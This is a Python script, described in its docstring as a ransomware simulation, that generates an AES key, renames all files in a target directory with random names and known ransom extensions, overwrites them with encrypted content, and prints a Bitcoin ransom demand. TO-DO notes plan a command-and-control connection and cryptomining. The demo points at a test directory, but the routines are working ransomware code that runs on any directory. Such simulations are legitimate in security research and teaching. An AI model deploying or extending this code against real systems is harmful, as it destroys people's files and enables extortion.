"""
This script simulates a ransomware attack by encrypting files in the specified directory.

TO DO: connection to the C2 server
TO DO: cryptomining
"""

import os
import string
import random
from Crypto.Cipher import AES
import pickle
import csv



# Define the ransomware key generator function
def generate_key():
    key = ""
    for i in range(16):
        key += random.choice(string.ascii_letters + string.digits)
    return key.encode()

def encrypt_file(filename, encryption_key):
    """
    Encrypts the specified file using AES encryption.
    filename: string (path to the file to encrypt)
    encryption_key: string
    """
    cipher = AES.new(encryption_key, AES.MODE_CBC, b'0123456789abcdef')
    with open(filename, "rb") as f:
        filedata = f.read()
        # Pad the file data so that its length is a multiple of 16 bytes
        padded_data = filedata + b"\0" * (AES.block_size - len(filedata) % AES.block_size)
        encrypted_data = cipher.encrypt(padded_data)
    with open(filename, "wb") as f:
        f.write(encrypted_data)


def encrypt_files(directory, encryption_key):
    """
    Encrypts all the files in the specified directory using AES encryption.
    directory: string (path to the directory containing the files to encrypt)
    encryption_key: string
    """
    for filename in os.listdir(directory):
        encrypt_file(os.path.join(directory, filename), encryption_key)

def get_random_extension():
    """
    Returns a random extension from the "data/known_ransom_extensions.csv" file.
    """
    with open(os.path.dirname(os.path.abspath(__file__)) + "/../data/known_ransom_extensions.csv") as f:
        reader = csv.reader(f)
        extensions = [row[0] for row in reader]
    return random.choice(extensions)

def rename_files(directory):
    """
    Renames all the files in the specified directory with unreadable names and extensions.
    directory: string (path to the directory containing the files to rename)
    """
    original_filenames = {}
    for filename in os.listdir(directory):
        new_filename = str(generate_key()) + "." + get_random_extension()
        # Keep track of original filenames
        original_filenames[new_filename] = os.path.splitext(filename)[0] + os.path.splitext(filename)[1]
        os.rename(os.path.join(directory, filename), os.path.join(directory, new_filename))
    return original_filenames



if __name__ == "__main__":
    # Define the directory path where dummy files are located
    directory = "./testdir"

    # Define the ransomware message to display
    ransom_message = "Your files have been encrypted. Please pay 1 Bitcoin to the following address to get the decryption key."

    # Simulate the ransomware attack
    encryption_key = generate_key()
    original_filenames = rename_files(directory)
    encrypt_files(directory, encryption_key)
    print(ransom_message)

    print("Encryption Key:", encryption_key)

    # save the original filenames to a pkl file
    with open(os.path.dirname(os.path.abspath(__file__)) + "/../data/original_filenames.pkl", "wb") as f:
        pickle.dump(original_filenames, f)

